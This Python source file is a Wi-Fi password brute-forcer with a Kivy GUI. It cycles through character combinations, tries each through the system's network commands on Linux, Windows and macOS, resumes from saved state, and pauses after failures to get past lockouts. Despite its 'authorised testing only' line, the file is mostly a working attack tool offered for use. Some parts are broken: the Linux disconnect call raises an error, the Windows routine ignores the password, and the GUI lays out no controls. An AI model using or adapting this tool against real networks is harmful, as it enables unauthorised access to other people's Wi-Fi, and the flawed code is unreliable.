#!/usr/bin/env python3
"""
Wi‑Fi Password Brute‑Forcer with Kivy GUI.
Resumable, cooldown support, cross‑platform.
For authorised testing only.
"""

import os
import json
import subprocess
import time
import sys
from threading import Thread
from queue import Queue
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.properties import StringProperty, NumericProperty, BooleanProperty

# ----------------------------------------------------------------------
# OS‑specific connection functions
# ----------------------------------------------------------------------

def connect_linux(ssid, password, interface):
    subprocess.run(["nmcli", "device", "disconnect", interface],
                   capture_output=True, stderr=subprocess.DEVNULL)
    try:
        result = subprocess.run(
            ["nmcli", "device", "wifi", "connect", ssid, "password", password,
             "iface", interface],
            capture_output=True, text=True, timeout=10
        )
        return "successfully activated" in result.stdout.lower()
    except:
        return False

def connect_windows(ssid, password, interface):
    # Real implementation would require creating a profile.
    # This is a placeholder; you'll need to adapt it.
    try:
        result = subprocess.run(
            ["netsh", "wlan", "connect", "name=" + ssid, "ssid=" + ssid,
             "interface=" + interface],
            capture_output=True, text=True, timeout=10
        )
        return "connection successful" in result.stdout.lower()
    except:
        return False

def connect_macos(ssid, password, interface):
    try:
        result = subprocess.run(
            ["networksetup", "-setairportnetwork", interface, ssid, password],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except:
        return False

def get_connect_func():
    if sys.platform.startswith('linux'):
        return connect_linux, "wlan0"
    elif sys.platform.startswith('win'):
        return connect_windows, "Wi-Fi"
    elif sys.platform.startswith('darwin'):
        return connect_macos, "Wi-Fi"
    else:
        raise OSError("Unsupported OS")

# ----------------------------------------------------------------------
# Resumable password generator
# ----------------------------------------------------------------------

class ResumablePasswordGenerator:
    def __init__(self, charset, min_len, max_len, state_file):
        self.charset = charset
        self.min_len = min_len
        self.max_len = max_len
        self.state_file = state_file
        self.charset_len = len(charset)
        self.current_state = self._load_state()

    def _load_state(self):
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    data = json.load(f)
                    return data.get("state", [0] * self.min_len)
            except:
                pass
        return [0] * self.min_len

    def _save_state(self, state):
        with open(self.state_file, 'w') as f:
            json.dump({"state": state}, f)

    def _next_combination(self, current):
        carry = 1
        for i in range(len(current) - 1, -1, -1):
            if carry == 0:
                break
            current[i] += 1
            if current[i] == self.charset_len:
                current[i] = 0
                carry = 1
            else:
                carry = 0
        if carry == 1:
            new_len = len(current) + 1
            if new_len > self.max_len:
                return None
            return [0] * new_len
        return current

    def generate(self):
        state = self.current_state[:]
        while state is not None:
            password = ''.join(self.charset[i] for i in state)
            yield password
            next_state = self._next_combination(state)
            self._save_state(next_state if next_state is not None else [])
            state = next_state

# ----------------------------------------------------------------------
# GUI main class
# ----------------------------------------------------------------------

class WiFiBruteforceGUI(BoxLayout):
    ssid = StringProperty("")
    min_len = NumericProperty(8)
    max_len = NumericProperty(12)
    charset = StringProperty("")
    attempts_before_cooldown = NumericProperty(10)
    cooldown_sec = NumericProperty(300)
    delay = NumericProperty(0.5)

    status = StringProperty("Idle")
    current_password = StringProperty("")
    attempts = NumericProperty(0)
    failures = NumericProperty(0)

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.connect_func, self.interface = get_connect_func()
        self.worker_thread = None
        self.stop_flag = False
        self.failure_counter = 0
        self.total_tested = 0
        self.state_file = "wifi_state.json"
        self.output_file = "correct_password.txt"
        self._update_queue = Queue()
        Clock.schedule_interval(self._update_ui, 0.1)

    def start_bruteforce(self):
        if self.worker_thread and self.worker_thread.is_alive():
            return
        self.stop_flag = False
        self.status = "Running"
        self.worker_thread = Thread(target=self._worker)
        self.worker_thread.daemon = True
        self.worker_thread.start()

    def stop_bruteforce(self):
        self.stop_flag = True

    def _worker(self):
        char_set = self.charset if self.charset else ''.join(chr(i) for i in range(32, 127))
        gen = ResumablePasswordGenerator(
            char_set,
            int(self.min_len),
            int(self.max_len),
            self.state_file
        )

        for pwd in gen.generate():
            if self.stop_flag:
                self._update_queue.put(('status', "Stopped"))
                break

            self._update_queue.put(('current_password', pwd))
            self._update_queue.put(('attempts', self.total_tested + 1))

            success = self.connect_func(self.ssid, pwd, self.interface)
            if success:
                self._update_queue.put(('status', "SUCCESS!"))
                self._update_queue.put(('current_password', f"FOUND: {pwd}"))
                with open(self.output_file, 'w') as f:
                    f.write(pwd)
                if os.path.exists(self.state_file):
                    os.remove(self.state_file)
                break
            else:
                self._update_queue.put(('failures', self.failure_counter + 1))
                self.failure_counter += 1
                self.total_tested += 1

                if self.failure_counter >= self.attempts_before_cooldown:
                    self._update_queue.put(('status', f"Cooldown {self.cooldown_sec}s"))
                    time.sleep(self.cooldown_sec)
                    self.failure_counter = 0
                    self._update_queue.put(('status', "Running"))

                time.sleep(self.delay)
        else:
            self._update_queue.put(('status', "Finished – no password found"))
        self.worker_thread = None

    def _update_ui(self, dt):
        while not self._update_queue.empty():
            key, value = self._update_queue.get()
            if key == 'current_password':
                self.current_password = value
            elif key == 'attempts':
                self.attempts = value
            elif key == 'failures':
                self.failures = value
            elif key == 'status':
                self.status = value

# ----------------------------------------------------------------------
# Kivy App
# ----------------------------------------------------------------------

class WiFiBruteforceApp(App):
    def build(self):
        return WiFiBruteforceGUI()

if __name__ == '__main__':
    WiFiBruteforceApp().run()
